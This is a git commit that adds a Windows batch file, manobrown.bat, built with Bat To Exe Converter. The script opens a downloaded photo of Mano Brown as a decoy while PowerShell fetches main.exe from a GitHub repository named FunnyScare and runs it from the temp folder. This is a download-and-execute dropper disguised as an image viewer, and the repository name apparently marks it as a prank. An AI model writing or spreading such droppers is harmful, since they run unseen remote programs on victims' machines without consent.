0cd311b9b97cf210a1c6da9ff6c631f124117cae
Vitor Barros Coutinho <69982009+TheCout@users.noreply.github.com>
2024-06-25 21:42:14 -0400

    The bat file

---
+++ manobrown.bat
@@ -0,0 +1,38 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFA1WTRaQAE+1EbsQ5+n//Naqo0MSGcAtd5jVl5KHLPQB5QjHdIYsmHNZl6s=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSTk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFA1WTRaQAES0A5EO4f7+00lmsEgcFOY6OLvJ27aPLOgc1kjle5kvxHVNloUJFB44
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+cd %TEMP%
+Powershell -Command "Invoke-WebRequest 'https://www.tenhomaisdiscosqueamigos.com/wp-content/uploads/2017/12/Mano-Brown-Filtro-Capa.jpg' -OutFile manobrown.png"
+manobrown.png
+Powershell -Command "Invoke-WebRequest 'https://github.com/TheCout/FunnyScare/raw/main/dist/main.exe' -OutFile manobrown.exe"
+manobrown.exe
